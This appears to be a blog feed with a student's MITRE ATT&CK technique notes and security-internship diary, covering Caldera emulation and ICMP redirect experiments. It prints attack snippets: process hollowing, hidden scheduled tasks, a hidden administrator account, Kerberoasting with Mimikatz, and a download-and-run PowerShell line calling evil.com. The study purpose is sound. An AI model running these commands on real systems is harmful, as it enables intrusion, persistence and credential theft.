cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateProcessW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;svchost.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(pi.hProcess, (LPCVOID)(ctx.Rdx + <span class="number">0x10</span>), &amp;pImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ZwUnmapViewOfSection</span>(pi.hProcess, pImageBase);</span><br><span class="line"><span class="built_in">VirtualAllocEx</span>(pi.hProcess, pImageBase, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, pImageBase, pMaliciousPE, dwImageSize, <span class="literal">NULL</span>);</span><br><span class="line">ctx.Rcx = (DWORD_PTR)pImageBase + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line"><span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"><span class="built_in">ResumeThread</span>(pi.hThread);</span><br></pre></td></tr></table></figure></li><li><strong>Atom Bombing</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATOM atom = <span class="built_in">GlobalAddAtom</span>(<span class="string">L&quot;MaliciousCode&quot;</span>);</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(hWnd, GWLP_USERDATA, atom);</span><br><span class="line"><span class="built_in">SendMessage</span>(hWnd, WM_GETTEXT, dwCodeSize, (LPARAM)pCodeBuffer);</span><br></pre></td></tr></table></figure></li><li><strong>Extra Window Memory 注入</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HWND hWnd = <span class="built_in">CreateWindow</span>(...);</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(hWnd, GWLP_USERDATA, (LONG_PTR)pMaliciousCode);</span><br><span class="line"><span class="built_in">SendMessage</span>(hWnd, WM_USER, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="排程工作-任務-Scheduled-Task-Job"><a href="#排程工作-任務-Scheduled-Task-Job" class="headerlink" title="排程工作&#x2F;任務 (Scheduled Task&#x2F;Job)"></a>排程工作&#x2F;任務 (Scheduled Task&#x2F;Job)</h2><ul><li><strong>COM 介面建立工作</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ITaskService* pService = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">CoCreateInstance</span>(CLSID_TaskScheduler, <span class="literal">NULL</span>, CLSCTX_INPROC_SERVER, IID_ITaskService, (<span class="type">void</span>**)&amp;pService);</span><br><span class="line">pService-&gt;<span class="built_in">Connect</span>(<span class="type">_variant_t</span>(), <span class="type">_variant_t</span>(), <span class="type">_variant_t</span>(), <span class="type">_variant_t</span>());</span><br><span class="line">ITaskDefinition* pTask = <span class="literal">NULL</span>;</span><br><span class="line">pService-&gt;<span class="built_in">NewTask</span>(<span class="number">0</span>, &amp;pTask);</span><br><span class="line"><span class="comment">// 設定觸發器和動作</span></span><br><span class="line"><span class="comment">// 註冊工作</span></span><br></pre></td></tr></table></figure></li><li><strong>隱藏的排程工作</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;\Microsoft\Windows\MaliciousTask&quot; /tr &quot;C:\malicious.exe&quot; /sc onstart /ru SYSTEM /f</span><br><span class="line">schtasks /create /xml &quot;C:\malicious_task.xml&quot; /tn &quot;HiddenTask&quot;</span><br></pre></td></tr></table></figure></li><li><strong>AT 命令（舊版系統）</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">at</span> <span class="number">23</span>:<span class="number">59</span> /every:M,T,W,Th,F,S,Su C:\malicious.exe</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="有效帳戶-Valid-Accounts"><a href="#有效帳戶-Valid-Accounts" class="headerlink" title="有效帳戶 (Valid Accounts)"></a>有效帳戶 (Valid Accounts)</h2><ul><li><strong>本機帳戶操作：建立隱藏管理員帳戶</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user hacker$ password123 /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators hacker$ /add</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /v &quot;hacker$&quot; /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure></li><li><strong>服務帳戶濫用：Kerberoasting 攻擊</strong>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;ServicePrincipalName <span class="operator">-ne</span> <span class="string">&quot;<span class="variable">$null</span>&quot;</span>&#125; <span class="literal">-Properties</span> ServicePrincipalName</span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">&quot;SPN/server.domain.com&quot;</span></span><br><span class="line"><span class="built_in">Invoke-Mimikatz</span> <span class="literal">-Command</span> <span class="string">&#x27;&quot;kerberos::list /export&quot;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="網域政策修改-Domain-Policy-Modification"><a href="#網域政策修改-Domain-Policy-Modification" class="headerlink" title="網域政策修改 (Domain Policy Modification)"></a>網域政策修改 (Domain Policy Modification)</h2><ul><li><strong>GPO 修改技術</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gpmc.msc</span><br><span class="line">Import-Module GroupPolicy</span><br><span class="line"><span class="built_in">Set</span>-GPRegistryValue -Name &quot;Default Domain Policy&quot; -Key &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; -ValueName &quot;Malicious&quot; -<span class="built_in">Type</span> String -Value &quot;C:\malicious.exe&quot;</span><br></pre></td></tr></table></figure></li><li><strong>SYSVOL 檔案修改</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 路徑: \\domain.com\SYSVOL\domain.com\Policies\&#123;GPO-GUID&#125;\Machine\Registry.pol</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="實用工具與命令參考"><a href="#實用工具與命令參考" class="headerlink" title="實用工具與命令參考"></a>實用工具與命令參考</h2><ul><li>權限列舉命令  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line">whoami /groups</span><br><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">accesschk.exe -uwcqv &quot;Users&quot; *</span><br><span class="line">accesschk.exe -kqsv HKLM\SYSTEM\CurrentControlSet\Services</span><br><span class="line">wmic service get name,displayname,pathname,startmode | <span class="built_in">findstr</span> /i &quot;auto&quot; | <span class="built_in">findstr</span> /i /v &quot;c:\windows\\&quot; | <span class="built_in">findstr</span> /i /v &quot;&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></li><li>PowerShell 權限提升腳本  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</span><br><span class="line"><span class="built_in">Get-CimInstance</span> Win32_StartupCommand | <span class="built_in">Select-Object</span> Name, command, Location, User</span><br><span class="line"><span class="built_in">Get-ScheduledTask</span> | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.Principal.UserId <span class="operator">-eq</span> <span class="string">&quot;SYSTEM&quot;</span>&#125;</span><br><span class="line"><span class="variable">$env:PATH</span> <span class="operator">-split</span> <span class="string">&#x27;;&#x27;</span> | <span class="built_in">ForEach-Object</span> &#123; <span class="keyword">if</span> (<span class="built_in">Test-Path</span> <span class="variable">$_</span>) &#123; <span class="built_in">Get-ChildItem</span> <span class="variable">$_</span> <span class="operator">-File</span> <span class="literal">-Filter</span> <span class="string">&quot;*.dll&quot;</span> &#125; &#125;</span><br></pre></td></tr></table></figure></li></ul></details><ul><li>A MITM and Pharming Attacks break down to the framework of ATT&amp;CK<table><thead><tr><th>Tactic</th><th>Technique</th><th>Project Corr</th></tr></thead><tbody><tr><td>Reconnaissance</td><td>Active Scanning</td><td><strong>Task I: Device Address Information Collection.</strong><br> The initial phase involves actively scanning the local network to identify potential targets by collecting IP and MAC addresses.</td></tr><tr><td>Initial Access</td><td>Exploit Public-Facing Application</td><td>While not a traditional public-facing application, the Wi-Fi network serves as the entry point.<br> The attack exploits weak configurations that allow for ARP and ICMP manipulation.</td></tr><tr><td>Execution</td><td>Inter-Process Communication</td><td><strong>Task II &amp; III.</strong> The attacker’s code will interact with the operating system’s networking stack at a low level using raw sockets and Netfilter queues to inject and manipulate traffic.</td></tr><tr><td>Credential Access</td><td>Input Capture</td><td><strong>Task III: DNS Spoofing.</strong> <br> The ultimate goal of the pharming attack is to present a phishing page to the victim to capture credentials or other sensitive information.</td></tr><tr><td>Lateral Movement &#x2F; Defense Evasion</td><td>Man-in-the-Middle</td><td><strong>Task II: ICMP Redirect Attack.</strong> <br> The core of the attack is to position the attacker’s machine between the victim and the gateway by manipulating the victim’s routing table with forged ICMP redirect messages. <br> This intercepts traffic for further exploitation.</td></tr><tr><td>Impact</td><td>Defacement</td><td><strong>Task III: DNS Spoofing</strong>. By redirecting the user to a phishing page, the attacker is effectively defacing the intended website from the victim’s perspective.</td></tr></tbody></table></li></ul>]]></content>
    
    
    <summary type="html">本文總結了MITRE ATT&amp;CK框架中的各種技術，包括權限提升、存取權杖操控、自動啟動執行等，並提供了相關的實作步驟和範例。,待更新</summary>
    
    
    
    <category term="資工" scheme="http://withoutdirection.github.io/categories/%E8%B3%87%E5%B7%A5/"/>
    
    
    <category term="資訊安全" scheme="http://withoutdirection.github.io/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/"/>
    
    <category term="MITRE ATT&amp;CK" scheme="http://withoutdirection.github.io/tags/MITRE-ATT-CK/"/>
    
  </entry>
  
  <entry>
    <title>中研院資訊所暑期實習</title>
    <link href="http://withoutdirection.github.io/sinica-cs-summer-internship/"/>
    <id>http://withoutdirection.github.io/sinica-cs-summer-internship/</id>
    <published>2025-06-30T16:00:00.000Z</published>
    <updated>2025-08-15T02:15:25.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="中研院資訊所暑期實習"><a href="#中研院資訊所暑期實習" class="headerlink" title="中研院資訊所暑期實習"></a>中研院資訊所暑期實習</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><h2 id="申請"><a href="#申請" class="headerlink" title="申請"></a>申請</h2><hr><h2 id="實習札記"><a href="#實習札記" class="headerlink" title="實習札記"></a>實習札記</h2><h3 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h3><details><summary>不想早起</summary><blockquote><p>因為是第一天怕遲到，早上六點半就起床去搭高鐵，結果早了快一個小時到，通勤時間約為一個半小時<br>上午都在On board，行政效率非常之好<br>mentor簡單介紹了前兩週的準備工作 </p></blockquote></details><ul><li>Note of today<ul><li>About Mittre ATT&amp;CK framework<ul><li><a href="https://attack.mitre.org/">ATT&amp;CK</a></li><li>The MITRE ATT&amp;CK framework is a globally accessible knowledge base of adversary tactics$<em>\text{攻擊目的}$ and techniques$</em>\text{使用的手法}$ based on <strong>real-world observations</strong>.</li></ul></li></ul></li><li>Today’s achievements:<ul><li><input checked="" disabled="" type="checkbox"> 完成On board</li><li><input checked="" disabled="" type="checkbox"> Caldera server establishment</li><li><input disabled="" type="checkbox"> Windows VM (act as a victim) setup</li></ul></li></ul><h3 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h3><details><summary>因為買咖啡遲到</summary><blockquote><p>今天起得比較晚，結果因為想買中研院外面的咖啡所以遲到，如果要吃早餐的話應該要六點半起床，帶去實驗室邊吃邊工作可以多睡半小時<br>誰上班第二天就遲到，我<br>但今天做好多事情，有點不知道明天還可以幹嘛</p></blockquote></details><ul><li><p>Note of today</p><ul><li>Deploy a Caldera agent on Windows VM<ol><li>Copy the psh script to the Windows VM</li><li>Run the script to install the agent</li><li>Check the agent status in the Caldera server</li></ol></li><li>Create a new operation with existed adversary profile<ul><li>The adversary profile is a set of tactics and techniques that the adversary is expected to use</li><li>The operation is a set of tasks that the adversary will perform on the victim machine</li><li>The operation can be run on the Caldera server to simulate the attack</li></ul></li><li><a href="https://www.freebuf.com/articles/sectool/348940.html">Windows worm#1</a><ul><li>目前VM配置不符合攻擊設定</li><li>等熟悉Caldera後再來研究這個攻擊手法</li></ul></li><li>Techniques that would be used in the “Discovery” tactics in Windows System  <ul><li><a href="https://attack.mitre.org/tactics/TA0007/">Attack Discovery</a><ul><li><a href="https://attack.mitre.org/techniques/T1087/001/">Local Account</a> <ul><li>E.g. Milan has run <code>C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2&gt;&amp;1</code> to discover local accounts.</li></ul></li><li><a href="https://attack.mitre.org/techniques/T1087/002/">Domain Account</a><ul><li>E.g. Chimera has has used <code>net user /dom</code> and <code>net user Administrator</code> to enumerate domain accounts including administrator accounts.</li><li><blockquote><p>在自己做指令測試的時候發現 <code>NET HELPMSG ****</code> 能用來解析 NET 命令的錯誤訊息</p></blockquote></li></ul></li><li><a href="https://attack.mitre.org/techniques/T1087/003/">Email Accounts</a><ul><li>Backdoor.Oldrea collects address book information from Outlook.</li></ul></li></ul></li><li><a href="https://attack.mitre.org/techniques/T1010/">Application Window Discovery</a><ul><li>E.g.  <code>tasklist /v /fo csv</code> to discover the application windows on the victim machine.</li><li><blockquote><p>大部分的攻擊需要有安裝外掛或是套件才能藉由這個指令來取得應用程式視窗資訊，單純的指令較少</p></blockquote></li></ul></li><li><a href="https://attack.mitre.org/techniques/T1201/">Password Policy Discovery</a> <ul><li><blockquote><p>可以用來幫助攻擊者創建通用密碼的列表，並啟動符合策略的詞典和&#x2F;或蠻力攻擊</p></blockquote></li><li>The <code>net accounts</code> and <code>net accounts /domain</code> commands with Net can be used to obtain password policy information.</li></ul></li><li><a href="http://attack.mitre.org/techniques/T1069/">Permission Group Discovery</a><ul><li><a href="https://attack.mitre.org/techniques/T1069/001/">Local Groups</a><ul><li>E.g. Chimera has used <code>net localgroup administrators</code> to identify accounts with local administrative rights.</li></ul></li><li><a href="https://attack.mitre.org/techniques/T1069/002/">Domain Groups</a><ul><li>BADHATCH can use <code>net.exe group &quot;domain admins&quot; /domain</code> to identify Domain Administrators.  </li><li><blockquote><p>Group相關的指令只能在有Domain的環境下使用，否則會出現錯誤訊息</p></blockquote></li></ul></li><li><a href="https://attack.mitre.org/techniques/T1082/">System Information Discovery</a><ul><li>E.g. APT41 uses multiple built-in commands such as <code>systeminfo</code> and <code>net config Workstation</code> to enumerate victim system basic configuration information.  </li><li>E.g. APT1 used the <code>ipconfig /all</code> command to gather network configuration information.</li><li>E.g. An APT3 downloader uses the Windows command <code>&quot;cmd.exe&quot; /C whoami</code> to verify that it is running with the elevated privileges of “System.</li><li>E.g. APT1 used the commands <code>net start</code> and <code>tasklist</code> to get a listing of the services on the system.</li></ul></li><li><a href="https://attack.mitre.org/techniques/T1518/">Software Discovery</a><ul><li>Get a list of all installed programs and their versions (<code>wmic product get name,version</code>). This list is then checked against public databases for known vulnerabilities.</li></ul></li></ul></li></ul></li></ul></li><li><p>Today’s achievements:</p><ul><li><input checked="" disabled="" type="checkbox"> Windows VM (act as a victim) setup and deploy a Caldera agent<ul><li>會需要把Windows的防火牆、自動掃描、防毒軟體關掉，否則agent會不能正確載入</li></ul></li><li><input checked="" disabled="" type="checkbox"> Implement a new adversary profile and execute the operation <ul><li>Operation: Windows worm#1: 未成功</li><li>Operation: Noisy neighbor: 成功，但由於VM是ethernet，所以攻擊wifi看不出來有沒有在做事</li><li>Operation: Collection: 成功， 於C:\Windows\System32 建立資料夾”Staged”</li><li>Operation: Discovery: 成功，但有部分指令(Discover domain controller&#x2F;  antivirus programs)無法執行</li></ul></li><li><input checked="" disabled="" type="checkbox"> Read “Discovery” tatics and related techniques in ATT&amp;CK framework<ul><li>超多</li><li>謝謝AI幫我整理重點</li></ul></li><li><input checked="" disabled="" type="checkbox"> Find the LOG in the agent after the operation is executed<ul><li>Operations執行後會在Event Viewer中的 <strong>Application and Services Logs</strong> 中的 <strong>Windows Powershell</strong> 找到相關的LOG</li><li>且，在<strong>Applications and Services Logs → Microsoft → Windows → PowerShell → Operational</strong> 有更詳細的LOG</li><li>在 <code>C:\Windows\Prefetch</code>裡會留下執行過的指令的記錄，但需要特定的程式才能解析其內容</li></ul></li></ul></li></ul><h3 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h3><details><summary>很多聊天(Meeting)</summary><blockquote><p>教授都出國，家裡沒大人<br>三位學長姐分別報了他們的進度，然後下午在樓下大聊特聊跟認識實驗室其他人</p></blockquote></details><ul><li><p>Note of today</p><ul><li>About Meeting<ol><li>AI agent to planning a cyberattack by prompting a CTI Report</li><li>Sandbox detection evasion<ol><li>Inverse compile the maleware and use transformer to generate the fumction relation graph</li></ol></li><li>Maleware log analysis and sort them into a Mitre ATT&amp;CK framework</li></ol></li><li>“Execution” tatics and related techniques in ATT&amp;CK framework<ul><li><a href="https://attack.mitre.org/tactics/TA0002/">Execution</a><ul><li><a href="https://attack.mitre.org/techniques/T1059/">Command and Scripting Interpreter</a><ul><li><a href="https://attack.mitre.org/techniques/T1059/001/">PowerShell</a><ul><li>PowerShell is a primary tool for attackers due to its power and integration with Windows.</li><li>Fileless Execution: Download and run code directly in memory.<ul><li><code>IEX (New-Object Net.WebClient).DownloadString(&#39;http://evil.com/payload.ps1&#39;)</code></li></ul></li><li>E.g. APT3 has used PowerShell on victim systems to download and run payloads after exploitation.</li></ul></li><li><a href="https://attack.mitre.org/techniques/T1059/003/">Windows Command Shell</a><ul><li>The standard <strong>cmd.exe</strong> is used for direct command execution and running batch scripts. </li><li>E.g. AuTo Stealer can use <strong>cmd.exe</strong> to execute a created batch file.</li></ul></li><li><a href="https://attack.mitre.org/techniques/T1059/006/">Python</a> <ul><li>Python comes with many built-in packages to interact with the underlying system, such as file operations and device I&#x2F;O.</li><li>E.g. APT39 has used a command line utility and a network scanner written in python.</li><li><blockquote><p>在Os上執行Python需要先安裝Python，且需要在PATH中設定Python的路徑</p></blockquote></li><li><blockquote><p>因此若Victim系統沒有安裝Python，則無法使用此技術</p></blockquote></li></ul></li><li><a href="https://attack.mitre.org/techniques/T1059/005/">Visual Basic</a><ul><li>VB is most often abused through macros in Microsoft Office documents.</li><li>E.g. APT37 executes shellcode and a VBA script to decode Base64 strings.</li></ul></li></ul></li><li><a href="https://attack.mitre.org/techniques/T1047/">Windows Management Instrumentation</a><ul><li>WMI is a powerful administrative feature that can be abused to execute code locally or remotely without dropping a file.</li><li>Direct Command: Use the wmic utility to start a process.<ul><li><code>wmic process call create &quot;calc.exe&quot;</code></li><li>E.g. APT29 used WMI to steal credentials and execute backdoors at a future time.</li></ul></li></ul></li><li><a href="https://attack.mitre.org/techniques/T1053/">Scheduled Tasks</a><ul><li>Attackers use the Windows Task Scheduler to execute code at specific times or in response to system events, which is a common persistence method.</li><li>CLI: Use the schtasks.exe utility.<ul><li><code>schtasks /create /tn &quot;Updater&quot; /tr &quot;c:\temp\evil.exe&quot; /sc onlogon /ru &quot;SYSTEM&quot;   </code></li></ul></li><li><a href="https://attack.mitre.org/techniques/T1053/005/">Scheduled Task</a>  <ul><li>An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence.</li><li>E.g. An APT3 downloader creates persistence by creating the following scheduled task: <code>schtasks /create /tn &quot;mysc&quot; /tr C:\Users\Public\test.exe /sc ONLOGON /ru &quot;System&quot;</code>.</li></ul></li><li><a href="https://attack.mitre.org/techniques/T1053/002/">At</a><ul><li>Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code.</li><li>E.g. APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network.</li></ul></li></ul></li></ul></li></ul></li><li>Create an adversary with “Discovery” and “Execution” tactics<ul><li>沒想像中的簡單，很多ability需要特定的輸入與輸出</li></ul></li></ul></li><li><p>Achievements of today:</p><ul><li><input checked="" disabled="" type="checkbox"> Read “Execution” tatics and related techniques in ATT&amp;CK framework</li><li><input checked="" disabled="" type="checkbox"> Create an adversary with “Discovery” and “Execution” tactics<ul><li>但還沒成功執行，可能是因為VM的設定問題</li></ul></li><li><input checked="" disabled="" type="checkbox"> Meeting with mentor and other interns<ul><li>了解其他人的研究方向與進度 </li><li>與實驗室其他學長姐與實習生認識</li></ul></li></ul></li></ul><h3 id="Day-4"><a href="#Day-4" class="headerlink" title="Day 4"></a>Day 4</h3><details><summary>誰邊上班邊看比賽</summary><blockquote><p>帶手沖咖啡來實驗室，實施咖啡外交<br>發現Mitre ATT&amp;CK每個Tatics的東西都多到爆炸，根本讀不完</p></blockquote></details><ul><li><p>Note of today</p><ul><li><a href="../Mitre-ATT-CK-Techniues-note">Privilege Escalation 技術與實作整理（ATT&amp;CK Framework）</a></li></ul></li><li><p>Today’s achievements:</p><ul><li><input checked="" disabled="" type="checkbox"> Read “Privilege Escalation” tatics and related techniques in ATT&amp;CK framework</li><li>[] 實作ICMP Redirect Attack <strong>未成功</strong><ul><li>在Command 下 python icmp_redirect.py “#{remote.device.ip}” “agent.ip”(<strong>agent.ip會抓不到</strong>)</li></ul></li></ul></li></ul><h3 id="Day-6"><a href="#Day-6" class="headerlink" title="Day 6"></a>Day 6</h3><details><summary>昨天放颱風假</summary><blockquote><p>被探班，吃了家常的豬肉拌麵<br>咖啡外交官，學長姐很喜歡手沖咖啡</p></blockquote></details><ul><li><p>Note of today</p><ul><li><a href="https://feifei.tw/attck-techniques-analyze/">ATT&amp;CK 36個 Techniques 分析</a></li><li><a href="https://hacksplaining.com/prevention/sql-injection">SQL injection</a></li></ul></li><li><p>Todat’s Achievements:</p><ul><li><input checked="" disabled="" type="checkbox"> VM network setting restart: 不知道為甚麼NAT network為自己掛掉，要重新把windows 裡面的network service restart </li><li><input checked="" disabled="" type="checkbox"> implement some abilities in Caldera<br>  - Enable Guest RDP Access (<strong>T1078.001</strong>): 需要先獲得系統管理員權限才能執行<br>  - External Remote Services(<strong>T1133</strong>): 需要extension_id </li><li><input checked="" disabled="" type="checkbox"> 寫了一個discovery ability用來列出同個網段中有相同default gateway的IP<ul><li>這個IP會被用來做ICMP Redirect Attack</li><li>如果要用caldera server做ability之間的溝通，必須要自訂義paraser</li></ul></li><li><input checked="" disabled="" type="checkbox"> ICMP_redirect.py: 實作ICMP Redirect Attack<ul><li>這個攻擊會在victim的路由表中加入一條指向attacker的路由</li><li>使得victim要做DNS查詢時會先發送到attacker</li></ul></li></ul></li><li><p>TODO:</p><ul><li><strong>7&#x2F;10</strong> 要報告這兩個禮拜做了甚麼</li><li><strong>7&#x2F;9</strong> 閱讀並實作<a href="https://feifei.tw/attck-techniques-analyze/">ATT&amp;CK 36個 Techniques 分析</a></li><li><strong>7&#x2F;9</strong> 整理這兩個禮拜做了甚麼</li></ul></li></ul><h3 id="Day-7"><a href="#Day-7" class="headerlink" title="Day 7"></a>Day 7</h3><details><summary>忘記帶筆電充電器</summary><blockquote><p>雨超大的早晨，匆忙出門改高鐵之下忘記帶筆電充電器<br>只好想辦法在沒電前盡量做完明天一定要有的東西</p></blockquote></details><ul><li>Today’s Achivements:<ul><li><input checked="" disabled="" type="checkbox"> 完成明天要報告的整理<ul><li>Mitre ATT&amp;CK Note: 閱讀完六種Tactics並整理出相關的Techniques </li><li>Caldera implementation:<ol><li>Deploy a Caldera agent on Windows VM  </li><li>以現有的Adversary Profile執行對應abilities於部屬的Windows Agent</li><li>以簡單的pwsh script建立abilities並執行</li><li>Save the corr logs on the Windows Agent<ol><li>Use <code>eventvwr</code> and choose <em>Windows Logs</em></li><li>Click on the <code>Action</code> menu, and then select <code>Save All Events As</code>.</li></ol></li><li>嘗試以python實作ICMP Redirect Attack and DNS spoofing並將其以Mitre ATT&amp;CK 框架建立ability，<strong>進行中</strong>:<ol><li>目前遭遇問題:  abilities之間傳遞的參數需要自訂義parser，以Caldera web GUI無法完成</li><li>目前進度: 能成功從agent端解析所有在同一個網段的IP、default gateway然後發送ICMP Redirect packet</li><li><a href="https://ieeexplore.ieee.org/abstract/document/10179441">ref paper</a></li><li><a href="https://support.huawei.com/enterprise/en/doc/EDOC1100174721/191b5fc1/icmp-redirect-message-format">ref 2</a></li></ol></li><li>嘗試以python-evtx 讀取Windows Agent的Event Log，<strong>進行中</strong>:<ol><li>目前遭遇問題: xml格式的Event Log無法正確解析成python dict <ul><li>猜測原因1，解析後的attribute 為空，導致無法正確解析</li><li>猜測原因2，elements的前面會有關於event的attribute，但這些attribute會被解析成dict的key，導致無法正確解析 (可能的解決辦法，用正規表式將這些attribute去除)</li></ul></li><li>目前進度: 能成功讀取xml格式的Event Log並output 所有elements</li></ol></li></ol></li></ul></li></ul></li></ul><h3 id="Day-8"><a href="#Day-8" class="headerlink" title="Day 8"></a>Day 8</h3><details><summary>第一次報進度</summary><blockquote><p>例行禮拜四meeting，但第一次報告自己做了甚麼<br>感覺學長姐比較approve自己在做攻擊的部分</p></blockquote></details><ul><li><p>Note of today</p><ul><li><p><a href="https://securelist.com/librarian-ghouls-apt-wakes-up-computers-to-steal-data-and-mine-crypto/116536/">APT case study</a></p><table><thead><tr><th align="left">ATT&amp;CK Tactic</th><th align="left">Technique ID</th><th align="left">Technique Name</th><th align="left">Librarian Ghouls</th></tr></thead><tbody><tr><td align="left"><strong>Initial Access (初始訪問)</strong></td><td align="left">T1566.001</td><td align="left">Spearphishing Attachment (魚叉式釣魚附件)</td><td align="left">透過偽裝成「支付訂單」的魚叉式釣魚郵件，誘使受害者下載並開啟受密碼保護的壓縮檔 (ZIP)。</td></tr><tr><td align="left"><strong>Execution (執行)</strong></td><td align="left">T1204.002</td><td align="left">Malicious File (惡意檔案)</td><td align="left">受害者被誘導執行壓縮檔內的自解壓縮安裝程式 (使用 Smart Install Maker 製作)。</td></tr><tr><td align="left"></td><td align="left">T1059.001</td><td align="left">PowerShell</td><td align="left">執行 <code>wol.ps1</code> 腳本來創建排程任務，以喚醒電腦。</td></tr><tr><td align="left"></td><td align="left">T1059.003</td><td align="left">Windows Command Shell (Windows 命令提示字元)</td><td align="left">執行 <code>rezet.cmd</code> 和 <code>bat.bat</code> 等多個批次處理腳本，以協調整個攻擊流程，包括下載工具、修改設定、執行竊密和清理等。</td></tr><tr><td align="left"><strong>Persistence (持續性)</strong></td><td align="left">T1053.005</td><td align="left">Scheduled Task (排程任務)</td><td align="left">1. 建立 <code>ShutdownAt5AM</code> 任務，定時關機以隱匿行蹤。&lt;br&gt;2. 建立 <code>WakeUpAndLaunchEdge</code> 任務，每日凌晨 1 點喚醒電腦，為攻擊者創造遠端存取的時間窗口。&lt;br&gt;3. 將惡意程式 (run.exe) 加入自啟動項目，以確保加密貨幣挖礦程式的持續運行。</td></tr><tr><td align="left"></td><td align="left">T1219</td><td align="left">Remote Access Software (遠端存取軟體)</td><td align="left">部署並配置合法的遠端桌面軟體 <code>AnyDesk</code>，設定固定密碼 <code>QWERTY1234566</code>，以便在無人干預的情況下進行遠端控制。</td></tr><tr><td align="left"><strong>Defense Evasion (防禦規避)</strong></td><td align="left">T1562.001</td><td align="left">Disable or Modify Tools (禁用或修改工具)</td><td align="left">使用 <code>Defender Control (dc.exe)</code> 工具來禁用 Windows Defender 防毒軟體。</td></tr><tr><td align="left"></td><td align="left">T1036.005</td><td align="left">Match Legitimate Name or Location (偽裝成合法名稱或路徑)</td><td align="left">1. 將惡意檔案放置在看似無害的 <code>C:\Intel</code> 目錄中。&lt;br&gt;2. 將下載的工具重命名為系統檔案，例如將 <code>AnyDesk</code> 偽裝成 <code>svchost.exe</code>。</td></tr><tr><td 